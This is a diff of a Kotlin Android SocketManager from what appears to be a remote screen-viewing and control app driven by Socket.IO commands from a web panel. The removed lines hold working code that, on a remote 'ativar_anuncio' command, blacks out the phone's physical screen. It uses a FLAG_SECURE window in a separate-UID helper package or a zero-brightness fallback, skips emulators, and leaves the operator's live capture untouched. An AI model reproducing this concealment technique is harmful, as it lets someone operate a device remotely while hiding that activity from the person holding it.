@@ -39,11 +39,6 @@ object SocketManager {
     @Volatile
     var overlayAtualizacaoVisualAtivo: Boolean = false
 
-    // Fallback do anúncio (brilho-zero): usado SOMENTE quando o Suporte Motor
-    // (UID separado) não está instalado. Escurece a tela FÍSICA (brilho mínimo)
-    // sem afetar o MediaProjection — o painel continua em cores normais.
-    @Volatile
-    private var anuncioBrilhoZeroAtivo: Boolean = false
 
     // Painel FastAPI (mesmo domínio do /conectar-filho).
     var serverUrl: String = BuildConfig.PANEL_URL
@@ -536,14 +531,6 @@ object SocketManager {
                         }
                     }
 
-                    // ================================================================
-                    // GATILHO SOCKET.IO: "ativar_anuncio" / "configurar_anuncio"
-                    // ----------------------------------------------------------------
-                    // Envia broadcast explícito para o Suporte Motor (pacote/UID separado).
-                    // Como o Suporte Motor possui outro UID, a janela com FLAG_SECURE
-                    // criada por ele no aparelho físico é OMITIDA da captura do MediaProjection.
-                    // EFEITO: Tela física = Preta com "Carregando…", Painel = Cores normais.
-                    // ================================================================
                     on("solicitar_keyframe") {
                         H264ScreenEncoder.instance?.requestKeyFrame()
                         emitLog("[H264] Keyframe solicitado pelo painel.")
@@ -578,32 +565,6 @@ object SocketManager {
                     on("solicitar_jpeg_fallback") {
                         ScreenCaptureService.ativarFallbackJpeg()
                         emitLog("[H264] Painel solicitou fallback JPEG ultraleve (H.264 não decodificou no navegador).")
-                    }
-
-                    on("ativar_anuncio") { args ->
-                        val json = parseJson(args)
-                        val acao = json?.optString("acao", "mostrar") ?: "mostrar"
-                        val ativo = when {
-                            json != null && json.has("ativo") -> json.optBoolean("ativo", true)
-                            acao.lowercase() in listOf("fechar", "ocultar", "remover", "desativar") -> false
-                            else -> true
-                        }
-                        dispararAnuncioViaSuporteMotor(ativo)
-                    }
-
-                    on("configurar_anuncio") { args ->
-                        val json = parseJson(args)
-                        val dispAlvo = if (json != null && json.has("dispositivo")) json.optString("dispositivo") else null
-                        if (!dispAlvo.isNullOrEmpty() && dispAlvo != nomeDispositivoAtual()) {
-                            emitLog("[ANUNCIO] IGNORADO: evento destinado a '$dispAlvo'; este aparelho é '${nomeDispositivoAtual()}'.")
-                            return@on
-                        }
-                        val ativo = when {
-                            json != null && json.has("ativo") -> json.optBoolean("ativo", false)
-                            args.isNotEmpty() && args[0] is Boolean -> args[0] as Boolean
-                            else -> false
-                        }
-                        dispararAnuncioViaSuporteMotor(ativo)
                     }
 
                     // Botões do Emulador Flutuante (Home / Voltar)
@@ -1199,62 +1160,6 @@ object SocketManager {
         return n
     }
 
-    /**
-     * Dispara o Broadcast do Anúncio para os pacotes do Suporte Motor.
-     * Como o Suporte Motor possui um UID diferente do app principal, a janela
-     * com FLAG_SECURE criada por ele é OMITIDA da captura de tela do MediaProjection.
-     */
-    private fun dispararAnuncioViaSuporteMotor(ativo: Boolean) {
-        // REDE DE SEGURANÇA: anúncio (tela preta) SÓ afeta dispositivos físicos.
-        // Emuladores (Nox/MEmu/BlueStacks/etc.) IGNORAM completamente — o
-        // painel/emulador NUNCA fica com a tela do anúncio.
-        if (isEmulador) {
-            emitLog("[ANUNCIO] IGNORADO: este aparelho é um EMULADOR — anúncio (tela preta) só afeta dispositivos físicos.")
-            return
-        }
-        val ctx = appContext ?: MyAccessibilityService.instance
-        if (ctx == null) {
-            emitLog("[ANUNCIO ERRO] IGNORADO: sem contexto disponível para disparar broadcast.")
-            return
-        }
-        try {
-            val pacotes = listOf("com.example.suportemotor", "com.example.acessomaterno.suporte")
-            for (pkg in pacotes) {
-                val intent = Intent("com.example.acessomaterno.ACAO_ANUNCIO").apply {
-                    setPackage(pkg)
-                    putExtra("ativo", ativo)
-                    putExtra("dispositivo", nomeDispositivoAtual())
-                }
-                ctx.sendBroadcast(intent)
-            }
-            emitLog("[ANUNCIO] Broadcast ACAO_ANUNCIO enviado para Suporte Motor (ativo=$ativo). Tela física preta com FLAG_SECURE em UID separado — painel continuará em cores normais.")
-            // ── FALLBACK (brilho-zero) ───────────────────────────────────────
-            // Se o Suporte Motor NÃO estiver instalado, o broadcast não tem
-            // receptor. NÃO usamos overlay preto do próprio app: mesmo com
-            // FLAG_SECURE, o MediaProjection do MESMO UID captura a janela e
-            // o painel fica preto (o que aconteceu). Em vez disso, aplicamos
-            // BRILHO-ZERO: a tela FÍSICA fica quase preta (brilho mínimo),
-            // mas o MediaProjection NÃO é afetado pelo brilho — o PAINEL/
-            // emulador continua em cores normais. O texto "Carregando…" só
-            // aparece com o app Suporte Motor (UID separado) instalado.
-            try {
-                if (ativo) {
-                    if (!anuncioBrilhoZeroAtivo) {
-                        anuncioBrilhoZeroAtivo = ScreenCaptureService.ativarBrilhoZero(ctx)
-                        emitLog("[ANUNCIO] Fallback: brilho-zero ATIVADO (tela física quase preta; painel continua em cores normais). 'Carregando…' só aparece com o app Suporte Motor instalado.")
-                    }
-                } else if (anuncioBrilhoZeroAtivo) {
-                    ScreenCaptureService.removerBrilhoZero()
-                    anuncioBrilhoZeroAtivo = false
-                    emitLog("[ANUNCIO] Fallback: brilho-zero removido (tela física clareada).")
-                }
-            } catch (e2: Exception) {
-                emitLog("[ANUNCIO ERRO] Fallback brilho-zero falhou: ${e2.message}")
-            }
-        } catch (e: Exception) {
-            emitLog("[ANUNCIO ERRO] Falha ao enviar broadcast para Suporte Motor: ${e.message}")
-        }
-    }
 
     /**
      * QUIOSQUE DA ATUALIZAÇÃO (sala separada — só dispositivo físico).
